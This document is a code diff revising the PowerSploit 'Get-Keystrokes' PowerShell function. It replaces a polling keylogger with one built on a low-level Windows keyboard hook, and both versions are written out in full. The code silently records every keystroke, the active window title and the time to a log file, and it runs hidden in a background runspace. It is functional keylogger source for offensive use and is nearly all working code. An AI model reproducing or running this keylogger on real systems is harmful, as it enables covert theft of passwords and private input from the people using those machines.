@@ -1,11 +1,12 @@
 function Get-Keystrokes {
 <#
 .SYNOPSIS
- 
+
     Logs keys pressed, time and the active window.
     
     PowerSploit Function: Get-Keystrokes
-    Author: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
+    Original Authors: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
+    Revised By: Jesse Davis (@secabstraction)
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
@@ -14,13 +15,13 @@ function Get-Keystrokes {
 
     Specifies the path where pressed key details will be logged. By default, keystrokes are logged to %TEMP%\key.log.
 
-.PARAMETER CollectionInterval
+.PARAMETER Timeout
 
     Specifies the interval in minutes to capture keystrokes. By default, keystrokes are captured indefinitely.
 
-.PARAMETER PollingInterval
+.PARAMETER PassThru
 
-    Specifies the time in milliseconds to wait between calls to GetAsyncKeyState. Defaults to 40 milliseconds.
+    Returns the keylogger's PowerShell object, so that it may manipulated (disposed) by the user; primarily for testing purposes.
 
 .EXAMPLE
 
@@ -28,234 +29,349 @@ function Get-Keystrokes {
 
 .EXAMPLE
 
-    Get-Keystrokes -CollectionInterval 20
-
-.EXAMPLE
-
-    Get-Keystrokes -PollingInterval 35
-
+    Get-Keystrokes -Timeout 20
+    
 .LINK
 
     http://www.obscuresec.com/
     http://www.exploit-monday.com/
+    https://github.com/secabstraction
 #>
-    [CmdletBinding()] Param (
+    [CmdletBinding()] 
+    Param (
         [Parameter(Position = 0)]
-        [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent $_)) -PathType Container})]
-        [String]
-        $LogPath = "$($Env:TEMP)\key.log",
+        [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent -Path $_)) -PathType Container})]
+        [String]$LogPath = "$($env:TEMP)\key.log",
 
         [Parameter(Position = 1)]
-        [UInt32]
-        $CollectionInterval,
+        [Double]$Timeout,
 
-        [Parameter(Position = 2)]
-        [Int32]
-        $PollingInterval = 40
+        [Parameter()]
+        [Switch]$PassThru
     )
 
     $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)
 
-    Write-Verbose "Logging keystrokes to $LogPath"
+    try { '"TypedKey","WindowTitle","Time"' | Out-File -FilePath $LogPath -Encoding unicode }
+    catch { throw $_ }
 
-    $Initilizer = {
-        $LogPath = 'REPLACEME'
+    $Script = {
+        Param (
+            [Parameter(Position = 0)]
+            [String]$LogPath,
 
-        '"WindowTitle","TypedKey","Time"' | Out-File -FilePath $LogPath -Encoding unicode
+            [Parameter(Position = 1)]
+            [Double]$Timeout
+        )
 
-        function KeyLog {
-            [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
+        function local:Get-DelegateType {
+            Param (
+                [OutputType([Type])]
+            
+                [Parameter( Position = 0)]
+                [Type[]]
+                $Parameters = (New-Object Type[](0)),
+            
+                [Parameter( Position = 1 )]
+                [Type]
+                $ReturnType = [Void]
+            )
 
-            try
-            {
-                $ImportDll = [User32]
-            }
-            catch
-            {
-                $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
-                $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
-                $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
-                $TypeBuilder = $ModuleBuilder.DefineType('User32', 'Public, Class')
+            $Domain = [AppDomain]::CurrentDomain
+            $DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
+            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+            $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+            $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+            $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+            $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+            $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+        
+            $TypeBuilder.CreateType()
+        }
+        function local:Get-ProcAddress {
+            Param (
+                [OutputType([IntPtr])]
+        
+                [Parameter( Position = 0, Mandatory = $True )]
+                [String]
+                $Module,
+            
+                [Parameter( Position = 1, Mandatory = $True )]
+                [String]
+                $Procedure
+            )
 
-                $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-                $FieldArray = [Reflection.FieldInfo[]] @(
-                    [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
-                    [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
-                    [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
-                    [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
-                    [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
-                    [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
-                )
+            # Get a reference to System.dll in the GAC
+            $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+                Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+            $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+            # Get a reference to the GetModuleHandle and GetProcAddress methods
+            $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+            $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
+            # Get a handle to the module specified
+            $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+            $tmpPtr = New-Object IntPtr
+            $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+        
+            # Return the address of the function
+            $GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+        }
 
-                $PInvokeMethod = $TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
-                $FieldValueArray = [Object[]] @(
-                    'GetAsyncKeyState',
-                    $True,
-                    $False,
-                    $True,
-                    [Runtime.InteropServices.CallingConvention]::Winapi,
-                    [Runtime.InteropServices.CharSet]::Auto
-                )
-                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
-                $PInvokeMethod.SetCustomAttribute($CustomAttribute)
+        #region Imports
 
-                $PInvokeMethod = $TypeBuilder.DefineMethod('GetKeyboardState', 'Public, Static', [Int32], [Type[]] @([Byte[]]))
-                $FieldValueArray = [Object[]] @(
-                    'GetKeyboardState',
-                    $True,
-                    $False,
-                    $True,
-                    [Runtime.InteropServices.CallingConvention]::Winapi,
-                    [Runtime.InteropServices.CharSet]::Auto
-                )
-                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
-                $PInvokeMethod.SetCustomAttribute($CustomAttribute)
+        [void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
 
-                $PInvokeMethod = $TypeBuilder.DefineMethod('MapVirtualKey', 'Public, Static', [Int32], [Type[]] @([Int32], [Int32]))
-                $FieldValueArray = [Object[]] @(
-                    'MapVirtualKey',
-                    $False,
-                    $False,
-                    $True,
-                    [Runtime.InteropServices.CallingConvention]::Winapi,
-                    [Runtime.InteropServices.CharSet]::Auto
-                )
-                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
-                $PInvokeMethod.SetCustomAttribute($CustomAttribute)
+        # SetWindowsHookEx
+        $SetWindowsHookExAddr = Get-ProcAddress user32.dll SetWindowsHookExA
+	    $SetWindowsHookExDelegate = Get-DelegateType @([Int32], [MulticastDelegate], [IntPtr], [Int32]) ([IntPtr])
+	    $SetWindowsHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetWindowsHookExAddr, $SetWindowsHookExDelegate)
 
-                $PInvokeMethod = $TypeBuilder.DefineMethod('ToUnicode', 'Public, Static', [Int32],
-                    [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
-                $FieldValueArray = [Object[]] @(
-                    'ToUnicode',
-                    $False,
-                    $False,
-                    $True,
-                    [Runtime.InteropServices.CallingConvention]::Winapi,
-                    [Runtime.InteropServices.CharSet]::Auto
-                )
-                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
-                $PInvokeMethod.SetCustomAttribute($CustomAttribute)
+        # CallNextHookEx
+        $CallNextHookExAddr = Get-ProcAddress user32.dll CallNextHookEx
+	    $CallNextHookExDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr], [IntPtr]) ([IntPtr])
+	    $CallNextHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CallNextHookExAddr, $CallNextHookExDelegate)
 
-                $PInvokeMethod = $TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
-                $FieldValueArray = [Object[]] @(
-                    'GetForegroundWindow',
-                    $True,
-                    $False,
-                    $True,
-                    [Runtime.InteropServices.CallingConvention]::Winapi,
-                    [Runtime.InteropServices.CharSet]::Auto
-                )
-                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
-                $PInvokeMethod.SetCustomAttribute($CustomAttribute)
+        # UnhookWindowsHookEx
+        $UnhookWindowsHookExAddr = Get-ProcAddress user32.dll UnhookWindowsHookEx
+	    $UnhookWindowsHookExDelegate = Get-DelegateType @([IntPtr]) ([Void])
+	    $UnhookWindowsHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UnhookWindowsHookExAddr, $UnhookWindowsHookExDelegate)
 
-                $ImportDll = $TypeBuilder.CreateType()
-            }
+        # PeekMessage
+        $PeekMessageAddr = Get-ProcAddress user32.dll PeekMessageA
+	    $PeekMessageDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([Void])
+	    $PeekMessage = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PeekMessageAddr, $PeekMessageDelegate)
 
-            Start-Sleep -Milliseconds $PollingInterval
+        # GetAsyncKeyState
+        $GetAsyncKeyStateAddr = Get-ProcAddress user32.dll GetAsyncKeyState
+	    $GetAsyncKeyStateDelegate = Get-DelegateType @([Windows.Forms.Keys]) ([Int16])
+	    $GetAsyncKeyState = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAsyncKeyStateAddr, $GetAsyncKeyStateDelegate)
 
-                try
-                {
+        # GetForegroundWindow
+        $GetForegroundWindowAddr = Get-ProcAddress user32.dll GetForegroundWindow
+	    $GetForegroundWindowDelegate = Get-DelegateType @() ([IntPtr])
+	    $GetForegroundWindow = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetForegroundWindowAddr, $GetForegroundWindowDelegate)
 
-                    #loop through typeable characters to see which is pressed
-                    for ($TypeableChar = 1; $TypeableChar -le 254; $TypeableChar++)
-                    {
-                        $VirtualKey = $TypeableChar
-                        $KeyResult = $ImportDll::GetAsyncKeyState($VirtualKey)
+        # GetWindowText
+        $GetWindowTextAddr = Get-ProcAddress user32.dll GetWindowTextA
+	    $GetWindowTextDelegate = Get-DelegateType @([IntPtr], [Text.StringBuilder], [Int32]) ([Void])
+	    $GetWindowText = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetWindowTextAddr, $GetWindowTextDelegate)
 
-                        #if the key is pressed
-                        if (($KeyResult -band 0x8000) -eq 0x8000)
-                        {
+        # GetModuleHandle
+        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
+	    $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
+	    $GetModuleHandle = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
+    
+        #endregion Imports
 
-                            #check for keys not mapped by virtual keyboard
-                            $LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
-                            $RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
-                            $LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
-                            $RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
-                            $LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
-                            $RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
-                            $TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
-                            $SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
-                            $DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
-                            $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
-                            $BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
-                            $LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
-                            $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
-                            $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
-                            $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
-                            $LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
-                            $RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000
+        $CallbackScript = {
+            Param (
+                [Parameter()]
+                [Int32]$Code,
 
-                            if ($LeftShift -or $RightShift) {$LogOutput += '[Shift]'}
-                            if ($LeftCtrl  -or $RightCtrl)  {$LogOutput += '[Ctrl]'}
-                            if ($LeftAlt   -or $RightAlt)   {$LogOutput += '[Alt]'}
-                            if ($TabKey)       {$LogOutput += '[Tab]'}
-                            if ($SpaceBar)     {$LogOutput += '[SpaceBar]'}
-                            if ($DeleteKey)    {$LogOutput += '[Delete]'}
-                            if ($EnterKey)     {$LogOutput += '[Enter]'}
-                            if ($BackSpaceKey) {$LogOutput += '[Backspace]'}
-                            if ($LeftArrow)    {$LogOutput += '[Left Arrow]'}
-                            if ($RightArrow)   {$LogOutput += '[Right Arrow]'}
-                            if ($UpArrow)      {$LogOutput += '[Up Arrow]'}
-                            if ($DownArrow)    {$LogOutput += '[Down Arrow]'}
-                            if ($LeftMouse)    {$LogOutput += '[Left Mouse]'}
-                            if ($RightMouse)   {$LogOutput += '[Right Mouse]'}
+                [Parameter()]
+                [IntPtr]$wParam,
 
-                            #check for capslock
-                            if ([Console]::CapsLock) {$LogOutput += '[Caps Lock]'}
+                [Parameter()]
+                [IntPtr]$lParam
+            )
 
-                            $MappedKey = $ImportDll::MapVirtualKey($VirtualKey, 3)
-                            $KeyboardState = New-Object Byte[] 256
-                            $CheckKeyboardState = $ImportDll::GetKeyboardState($KeyboardState)
+            $Keys = [Windows.Forms.Keys]
+        
+            $MsgType = $wParam.ToInt32()
 
-                            #create a stringbuilder object
-                            $StringBuilder = New-Object -TypeName System.Text.StringBuilder;
-                            $UnicodeKey = $ImportDll::ToUnicode($VirtualKey, $MappedKey, $KeyboardState, $StringBuilder, $StringBuilder.Capacity, 0)
+            # Process WM_KEYDOWN & WM_SYSKEYDOWN messages
+            if ($Code -ge 0 -and ($MsgType -eq 0x100 -or $MsgType -eq 0x104)) {
+            
+                $hWindow = $GetForegroundWindow.Invoke()
 
-                            #convert typed characters
-                            if ($UnicodeKey -gt 0) {
-                                $TypedCharacter = $StringBuilder.ToString()
-                                $LogOutput += ('['+ $TypedCharacter +']')
-                            }
+                $ShiftState = $GetAsyncKeyState.Invoke($Keys::ShiftKey)
+                if (($ShiftState -band 0x8000) -eq 0x8000) { $Shift = $true }
+                else { $Shift = $false }
 
-                            #get the title of the foreground window
-                            $TopWindow = $ImportDll::GetForegroundWindow()
-                            $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
+                $Caps = [Console]::CapsLock
 
-                            #get the current DTG
-                            $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
+                # Read virtual-key from buffer
+                $vKey = [Windows.Forms.Keys][Runtime.InteropServices.Marshal]::ReadInt32($lParam)
 
-                            #Create a custom object to store results
-                            $ObjectProperties = @{'Key Typed' = $LogOutput;
-                                                  'Time' = $TimeStamp;
-                                                  'Window Title' = $WindowTitle}
-                            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
-
-                            # Stupid hack since Export-CSV doesn't have an append switch in PSv2
-                            $CSVEntry = ($ResultsObject | ConvertTo-Csv -NoTypeInformation)[1]
-
-                            #return results
-                            Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode
-
+                # Parse virtual-key
+                if ($vKey -gt 64 -and $vKey -lt 91) { # Alphabet characters
+                    if ($Shift -xor $Caps) { $Key = $vKey.ToString() }
+                    else { $Key = $vKey.ToString().ToLower() }
+                }
+                elseif ($vKey -ge 96 -and $vKey -le 111) { # Number pad characters
+                    switch ($vKey.value__) {
+                        96 { $Key = '0' }
+                        97 { $Key = '1' }
+                        98 { $Key = '2' }
+                        99 { $Key = '3' }
+                        100 { $Key = '4' }
+                        101 { $Key = '5' }
+                        102 { $Key = '6' }
+                        103 { $Key = '7' }
+                        104 { $Key = '8' }
+                        105 { $Key = '9' }
+                        106 { $Key = "*" }
+                        107 { $Key = "+" }
+                        108 { $Key = "|" }
+                        109 { $Key = "-" }
+                        110 { $Key = "." }
+                        111 { $Key = "/" }
+                    }
+                }
+                elseif (($vKey -ge 48 -and $vKey -le 57) -or ($vKey -ge 186 -and $vKey -le 192) -or ($vKey -ge 219 -and $vKey -le 222)) {                      
+                    if ($Shift) {                           
+                        switch ($vKey.value__) { # Shiftable characters
+                            48 { $Key = ')' }
+                            49 { $Key = '!' }
+                            50 { $Key = '@' }
+                            51 { $Key = '#' }
+                            52 { $Key = '$' }
+                            53 { $Key = '%' }
+                            54 { $Key = '^' }
+                            55 { $Key = '&' }
+                            56 { $Key = '*' }
+                            57 { $Key = '(' }
+                            186 { $Key = ':' }
+                            187 { $Key = '+' }
+                            188 { $Key = '<' }
+                            189 { $Key = '_' }
+                            190 { $Key = '>' }
+                            191 { $Key = '?' }
+                            192 { $Key = '~' }
+                            219 { $Key = '{' }
+                            220 { $Key = '|' }
+                            221 { $Key = '}' }
+                            222 { $Key = '<Double Quotes>' }
+                        }
+                    }
+                    else {                           
+                        switch ($vKey.value__) {
+                            48 { $Key = '0' }
+                            49 { $Key = '1' }
+                            50 { $Key = '2' }
+                            51 { $Key = '3' }
+                            52 { $Key = '4' }
+                            53 { $Key = '5' }
+                            54 { $Key = '6' }
+                            55 { $Key = '7' }
+                            56 { $Key = '8' }
+                            57 { $Key = '9' }
+                            186 { $Key = ';' }
+                            187 { $Key = '=' }
+                            188 { $Key = ',' }
+                            189 { $Key = '-' }
+                            190 { $Key = '.' }
+                            191 { $Key = '/' }
+                            192 { $Key = '`' }
+                            219 { $Key = '[' }
+                            220 { $Key = '\' }
+                            221 { $Key = ']' }
+                            222 { $Key = '<Single Quote>' }
                         }
                     }
                 }
-                catch {}
+                else {
+                    switch ($vKey) {
+                        $Keys::F1  { $Key = '<F1>' }
+                        $Keys::F2  { $Key = '<F2>' }
+                        $Keys::F3  { $Key = '<F3>' }
+                        $Keys::F4  { $Key = '<F4>' }
+                        $Keys::F5  { $Key = '<F5>' }
+                        $Keys::F6  { $Key = '<F6>' }
+                        $Keys::F7  { $Key = '<F7>' }
+                        $Keys::F8  { $Key = '<F8>' }
+                        $Keys::F9  { $Key = '<F9>' }
+                        $Keys::F10 { $Key = '<F10>' }
+                        $Keys::F11 { $Key = '<F11>' }
+                        $Keys::F12 { $Key = '<F12>' }
+			
+                        $Keys::Snapshot    { $Key = '<Print Screen>' }
+                        $Keys::Scroll      { $Key = '<Scroll Lock>' }
+                        $Keys::Pause       { $Key = '<Pause/Break>' }
+                        $Keys::Insert      { $Key = '<Insert>' }
+                        $Keys::Home        { $Key = '<Home>' }
+                        $Keys::Delete      { $Key = '<Delete>' }
+                        $Keys::End         { $Key = '<End>' }
+                        $Keys::Prior       { $Key = '<Page Up>' }
+                        $Keys::Next        { $Key = '<Page Down>' }
+                        $Keys::Escape      { $Key = '<Esc>' }
+                        $Keys::NumLock     { $Key = '<Num Lock>' }
+                        $Keys::Capital     { $Key = '<Caps Lock>' }
+                        $Keys::Tab         { $Key = '<Tab>' }
+                        $Keys::Back        { $Key = '<Backspace>' }
+                        $Keys::Enter       { $Key = '<Enter>' }
+                        $Keys::Space       { $Key = '< >' }
+                        $Keys::Left        { $Key = '<Left>' }
+                        $Keys::Up          { $Key = '<Up>' }
+                        $Keys::Right       { $Key = '<Right>' }
+                        $Keys::Down        { $Key = '<Down>' }
+                        $Keys::LMenu       { $Key = '<Alt>' }
+                        $Keys::RMenu       { $Key = '<Alt>' }
+                        $Keys::LWin        { $Key = '<Windows Key>' }
+                        $Keys::RWin        { $Key = '<Windows Key>' }
+                        $Keys::LShiftKey   { $Key = '<Shift>' }
+                        $Keys::RShiftKey   { $Key = '<Shift>' }
+                        $Keys::LControlKey { $Key = '<Ctrl>' }
+                        $Keys::RControlKey { $Key = '<Ctrl>' }
+                    }
+                }
+
+                # Get foreground window's title
+                $Title = New-Object Text.Stringbuilder 256
+                $GetWindowText.Invoke($hWindow, $Title, $Title.Capacity)
+
+                # Define object properties
+                $Props = @{
+                    Key = $Key
+                    Time = [DateTime]::Now
+                    Window = $Title.ToString()
+                }
+
+                $obj = New-Object psobject -Property $Props
+            
+                # Stupid hack since Export-CSV doesn't have an append switch in PSv2
+                $CSVEntry = ($obj | Select-Object Key,Window,Time | ConvertTo-Csv -NoTypeInformation)[1]
+
+                #return results
+                Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode
             }
+            return $CallNextHookEx.Invoke([IntPtr]::Zero, $Code, $wParam, $lParam)
         }
 
-    $Initilizer = [ScriptBlock]::Create(($Initilizer -replace 'REPLACEME', $LogPath))
+        # Cast scriptblock as LowLevelKeyboardProc callback
+        $Delegate = Get-DelegateType @([Int32], [IntPtr], [IntPtr]) ([IntPtr])
+        $Callback = $CallbackScript -as $Delegate
+    
+        # Get handle to PowerShell for hook
+        $PoshModule = (Get-Process -Id $PID).MainModule.ModuleName
+        $ModuleHandle = $GetModuleHandle.Invoke($PoshModule)
 
-    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {Keylog}} -Name Keylogger | Out-Null
+        # Set WM_KEYBOARD_LL hook
+        $Hook = $SetWindowsHookEx.Invoke(0xD, $Callback, $ModuleHandle, 0)
+    
+        $Stopwatch = [Diagnostics.Stopwatch]::StartNew()
 
-    if ($PSBoundParameters['CollectionInterval'])
-    {
-        $Timer = New-Object Timers.Timer($CollectionInterval * 60 * 1000)
+        while ($true) {
+            if ($PSBoundParameters.Timeout -and ($Stopwatch.Elapsed.TotalMinutes -gt $Timeout)) { break }
+            $PeekMessage.Invoke([IntPtr]::Zero, [IntPtr]::Zero, 0x100, 0x109, 0)
+            Start-Sleep -Milliseconds 10
+        }
 
-        Register-ObjectEvent -InputObject $Timer -EventName Elapsed -SourceIdentifier ElapsedAction -Action {
-            Stop-Job -Name Keylogger
-            Unregister-Event -SourceIdentifier ElapsedAction
-            $Sender.Stop()
-        } | Out-Null
+        $Stopwatch.Stop()
+    
+        # Remove the hook
+        $UnhookWindowsHookEx.Invoke($Hook)
     }
 
+    # Setup KeyLogger's runspace
+    $PowerShell = [PowerShell]::Create()
+    [void]$PowerShell.AddScript($Script)
+    [void]$PowerShell.AddArgument($LogPath)
+    if ($PSBoundParameters.Timeout) { [void]$PowerShell.AddArgument($Timeout) }
+
+    # Start KeyLogger
+    [void]$PowerShell.BeginInvoke()
+
+    if ($PassThru.IsPresent) { return $PowerShell }
 }
